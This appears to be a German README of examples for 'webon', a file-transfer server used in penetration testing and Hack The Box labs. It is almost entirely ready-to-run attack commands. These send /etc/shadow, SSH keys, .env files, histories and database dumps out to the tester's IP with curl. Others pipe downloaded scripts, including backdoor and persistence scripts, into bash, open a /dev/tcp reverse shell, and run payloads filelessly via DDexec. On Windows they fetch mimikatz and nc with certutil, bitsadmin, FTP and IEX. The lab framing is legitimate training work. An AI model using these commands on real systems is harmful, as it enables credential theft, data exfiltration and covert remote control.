# 📚 webon - Erweiterte Beispiele

> Praktische Beispiele für verschiedene Pentesting-Szenarien.

---

## 🎯 Inhaltsverzeichnis

1. [Grundlegende Transfers](#1-grundlegende-transfers)
2. [Download & Execute](#2-download--execute)
3. [Loot Collection](#3-loot-collection)
4. [Fileless Execution (DDexec)](#4-fileless-execution-ddexec)
5. [Windows Targets](#5-windows-targets)
6. [Pivoting & Tunneling](#6-pivoting--tunneling)
7. [Datenbank Exfiltration](#7-datenbank-exfiltration)
8. [Post-Exploitation](#8-post-exploitation)

---

## 1️⃣ Grundlegende Transfers

### Setup auf Angreifer-PC

```bash
# Ordnerstruktur
mkdir -p /opt/htb/{tools,loot}

# Tools platzieren
cp linpeas.sh pspy64 chisel /opt/htb/tools/

# Server starten
cd /opt/htb/loot
sudo webon -o /opt/htb/tools
```

### Dateien herunterladen

```bash
# curl
curl http://10.10.14.5/linpeas.sh -o linpeas.sh

# wget
wget http://10.10.14.5/linpeas.sh

# Mit anderem Namen
curl http://10.10.14.5/linpeas.sh -o lp.sh
wget http://10.10.14.5/linpeas.sh -O lp.sh
```

### Dateien hochladen

```bash
# Einzelne Datei
curl -X POST --data-binary @/etc/passwd http://10.10.14.5/passwd.txt

# Mit Pipe
cat /etc/shadow | curl -X POST --data-binary @- http://10.10.14.5/shadow.txt

# Befehlsausgabe
id | curl -X POST --data-binary @- http://10.10.14.5/id.txt
uname -a | curl -X POST --data-binary @- http://10.10.14.5/uname.txt
```

---

## 2️⃣ Download & Execute

### Einfache Ausführung

```bash
# curl | bash
curl http://10.10.14.5/linpeas.sh | bash

# wget
wget -qO- http://10.10.14.5/linpeas.sh | bash

# Mit Ausgabe speichern
curl http://10.10.14.5/linpeas.sh | bash | tee /tmp/linpeas_output.txt

# Dann hochladen
curl -X POST --data-binary @/tmp/linpeas_output.txt http://10.10.14.5/linpeas_output.txt
```

### Python Scripts

```bash
# Python 3
curl http://10.10.14.5/enum.py | python3

# Mit Argumenten
curl http://10.10.14.5/exploit.py -o /tmp/x.py
python3 /tmp/x.py --target 127.0.0.1
```

### Binaries ausführen

```bash
# Herunterladen, ausführbar machen, ausführen
curl http://10.10.14.5/pspy64 -o /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy

# One-Liner
curl http://10.10.14.5/pspy64 -o /tmp/p && chmod +x /tmp/p && /tmp/p
```

### Im Hintergrund

```bash
# Mit nohup
curl http://10.10.14.5/backdoor.sh | nohup bash &

# Mit disown
curl http://10.10.14.5/persistence.sh | bash & disown
```

---

## 3️⃣ Loot Collection

### Setup

```bash
# Auf Angreifer-PC
cd /opt/htb/loot/box-name
sudo webon -o /opt/htb/tools
```

### Wichtige Dateien sammeln

```bash
# Credentials
curl -X POST --data-binary @/etc/passwd http://10.10.14.5/passwd
curl -X POST --data-binary @/etc/shadow http://10.10.14.5/shadow
curl -X POST --data-binary @/etc/group http://10.10.14.5/group

# SSH Keys
curl -X POST --data-binary @~/.ssh/id_rsa http://10.10.14.5/id_rsa
curl -X POST --data-binary @~/.ssh/authorized_keys http://10.10.14.5/authorized_keys

# History
curl -X POST --data-binary @~/.bash_history http://10.10.14.5/bash_history
curl -X POST --data-binary @~/.zsh_history http://10.10.14.5/zsh_history

# Config Files
curl -X POST --data-binary @/etc/crontab http://10.10.14.5/crontab
curl -X POST --data-binary @/etc/sudoers http://10.10.14.5/sudoers
```

### Automatisiertes Sammeln

```bash
# Sammle mehrere Dateien
for f in /etc/passwd /etc/shadow /etc/hosts ~/.bash_history; do
  [ -f "$f" ] && curl -X POST --data-binary @"$f" "http://10.10.14.5/$(basename $f)"
done

# Alle .conf Dateien in /etc
find /etc -name "*.conf" -exec curl -X POST --data-binary @{} http://10.10.14.5/{} \; 2>/dev/null
```

### Komprimierte Archive

```bash
# Ganzen Ordner
tar czf - /var/www | curl -X POST --data-binary @- http://10.10.14.5/www.tar.gz

# Logs
tar czf - /var/log | curl -X POST --data-binary @- http://10.10.14.5/logs.tar.gz

# Home-Verzeichnisse
tar czf - /home | curl -X POST --data-binary @- http://10.10.14.5/home.tar.gz
```

---

## 4️⃣ Fileless Execution (DDexec)

### Setup

```bash
# DDexec Script bereitstellen
# Siehe: https://github.com/arget13/DDexec
cp ddexec.sh /opt/htb/tools/

# Binary base64 kodieren
base64 -w0 /opt/htb/tools/reverse_shell > /opt/htb/tools/shell.b64

# Server starten
sudo webon -o /opt/htb/tools
```

### Ausführung

```bash
# Methode 1: Pipe zu DDexec
curl http://10.10.14.5/shell.b64 | base64 -d | bash <(curl http://10.10.14.5/ddexec.sh) /bin/bash

# Methode 2: Als fd
curl http://10.10.14.5/shell.b64 | base64 -d > /proc/self/fd/3
bash <(curl http://10.10.14.5/ddexec.sh) /proc/self/fd/3

# Methode 3: Named Pipe
mkfifo /tmp/p
curl http://10.10.14.5/shell.b64 | base64 -d > /tmp/p &
bash <(curl http://10.10.14.5/ddexec.sh) /tmp/p
```

### Reverse Shell Fileless

```bash
# Reverse Shell Payload als Base64
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64 -w0 > /opt/htb/tools/revsh.b64

# Auf Zielmaschine
curl http://10.10.14.5/revsh.b64 | base64 -d | bash
```

---

## 5️⃣ Windows Targets

### FTP-Modus starten

```bash
sudo webon -o /opt/htb/tools --ftp
```

### PowerShell Download

```powershell
# Invoke-WebRequest
iwr http://10.10.14.5/nc.exe -OutFile nc.exe
Invoke-WebRequest http://10.10.14.5/mimikatz.exe -OutFile mimi.exe

# WebClient
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','nc.exe')

# One-Liner Download & Execute
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')
```

### FTP (Immer verfügbar!)

```cmd
REM One-Liner
echo open 10.10.14.5>x&echo anonymous>>x&echo anonymous>>x&echo binary>>x&echo get nc.exe>>x&echo bye>>x&ftp -n -s:x

REM Als Batch-Script
echo open 10.10.14.5 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get nc.exe >> ftp.txt
echo get mimikatz.exe >> ftp.txt
echo put sam.hiv >> ftp.txt
echo bye >> ftp.txt
ftp -n -s:ftp.txt
```

### certutil (Windows Built-in)

```cmd
certutil -urlcache -split -f http://10.10.14.5/nc.exe nc.exe
certutil -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe
```

### bitsadmin

```cmd
bitsadmin /transfer job /download /priority high http://10.10.14.5/nc.exe %TEMP%\nc.exe
```

### Upload von Windows

```powershell
# PowerShell
$content = [System.IO.File]::ReadAllBytes("C:\Users\admin\sam.hiv")
Invoke-WebRequest -Uri http://10.10.14.5/sam.hiv -Method POST -Body $content

# Base64 Methode
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.exe"))
Invoke-WebRequest -Uri http://10.10.14.5/file.b64 -Method POST -Body $b64
```

---

## 6️⃣ Pivoting & Tunneling

### Chisel

```bash
# Auf Angreifer-PC
chisel server -p 8000 --reverse

# Chisel bereitstellen
sudo webon -o /opt/htb/tools
```

```bash
# Auf Zielmaschine
curl http://10.10.14.5/chisel -o /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.14.5:8000 R:socks
```

### Ligolo-ng

```bash
# Auf Angreifer-PC
./proxy -selfcert -laddr 0.0.0.0:11601

# Agent bereitstellen
sudo webon -o /opt/htb/tools
```

```bash
# Auf Zielmaschine
curl http://10.10.14.5/agent -o /tmp/agent
chmod +x /tmp/agent
/tmp/agent -connect 10.10.14.5:11601 -ignore-cert
```

### SSH Tunneling

```bash
# Reverse Port Forward
curl http://10.10.14.5/id_rsa -o /tmp/key
chmod 600 /tmp/key
ssh -i /tmp/key -R 9050:127.0.0.1:9050 user@10.10.14.5 -fN

# Dynamic Port Forward (SOCKS)
ssh -i /tmp/key -D 9050 user@10.10.14.5 -fN
```

---

## 7️⃣ Datenbank Exfiltration

### MySQL

```bash
# Dump erstellen und hochladen
mysqldump -u root -p'password' database | curl -X POST --data-binary @- http://10.10.14.5/db.sql

# Komprimiert
mysqldump -u root -p'password' --all-databases | gzip | curl -X POST --data-binary @- http://10.10.14.5/all_dbs.sql.gz
```

### PostgreSQL

```bash
pg_dump -U postgres database | curl -X POST --data-binary @- http://10.10.14.5/postgres.sql
```

### SQLite

```bash
# Direkt hochladen
curl -X POST --data-binary @/var/www/app/database.db http://10.10.14.5/database.db

# Als SQL Dump
sqlite3 /var/www/app/database.db .dump | curl -X POST --data-binary @- http://10.10.14.5/sqlite.sql
```

### MongoDB

```bash
mongodump --out /tmp/mongodump
tar czf - /tmp/mongodump | curl -X POST --data-binary @- http://10.10.14.5/mongo.tar.gz
```

---

## 8️⃣ Post-Exploitation

### Credentials Hunting

```bash
# .env Dateien
find / -name ".env" 2>/dev/null | while read f; do
  curl -X POST --data-binary @"$f" "http://10.10.14.5/env_$(echo $f | tr '/' '_')"
done

# Konfigurationsdateien mit Passwörtern
grep -r "password" /etc 2>/dev/null | curl -X POST --data-binary @- http://10.10.14.5/passwords_etc.txt
grep -r "password" /var/www 2>/dev/null | curl -X POST --data-binary @- http://10.10.14.5/passwords_www.txt

# WordPress
curl -X POST --data-binary @/var/www/html/wp-config.php http://10.10.14.5/wp-config.php
```

### SUID/Capabilities

```bash
# SUID Binaries finden
find / -perm -4000 2>/dev/null | curl -X POST --data-binary @- http://10.10.14.5/suid.txt

# Capabilities
getcap -r / 2>/dev/null | curl -X POST --data-binary @- http://10.10.14.5/caps.txt
```

### Prozesse & Netzwerk

```bash
# Laufende Prozesse
ps auxwww | curl -X POST --data-binary @- http://10.10.14.5/ps.txt

# Netzwerk
netstat -tulpn | curl -X POST --data-binary @- http://10.10.14.5/netstat.txt
ss -tulpn | curl -X POST --data-binary @- http://10.10.14.5/ss.txt

# Interne Hosts
cat /etc/hosts | curl -X POST --data-binary @- http://10.10.14.5/hosts.txt
```

### Persistence Check

```bash
# Cron Jobs
cat /etc/crontab | curl -X POST --data-binary @- http://10.10.14.5/crontab.txt
ls -la /etc/cron.* | curl -X POST --data-binary @- http://10.10.14.5/cron_dirs.txt

# Systemd Services
systemctl list-units --type=service | curl -X POST --data-binary @- http://10.10.14.5/services.txt

# Init Scripts
ls -la /etc/init.d/ | curl -X POST --data-binary @- http://10.10.14.5/initd.txt
```

---

## 📋 Kompletter Workflow Beispiel

```bash
# === ANGREIFER-PC ===

# 1. Setup
mkdir -p /opt/htb/target/loot
cd /opt/htb/target/loot

# 2. Server starten
sudo webon -o /opt/htb/tools

# 3. Listener für Reverse Shell
nc -lvnp 4444


# === ZIELMASCHINE ===

# 4. Enumeration Tools holen und ausführen
curl 10.10.14.5/linpeas.sh | bash | tee /tmp/linpeas.txt
curl -X POST --data-binary @/tmp/linpeas.txt http://10.10.14.5/linpeas.txt

# 5. Weitere Enumeration
curl 10.10.14.5/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy
timeout 60 /tmp/pspy > /tmp/pspy.txt 2>&1
curl -X POST --data-binary @/tmp/pspy.txt http://10.10.14.5/pspy.txt

# 6. Credentials sammeln
curl -X POST --data-binary @/etc/passwd http://10.10.14.5/passwd
curl -X POST --data-binary @/etc/shadow http://10.10.14.5/shadow

# 7. Privilege Escalation Exploit holen
curl 10.10.14.5/exploit.sh -o /tmp/exp.sh && chmod +x /tmp/exp.sh
/tmp/exp.sh

# 8. Root Flag
cat /root/root.txt | curl -X POST --data-binary @- http://10.10.14.5/root.txt
```

---

**Happy Hacking! 🎯**
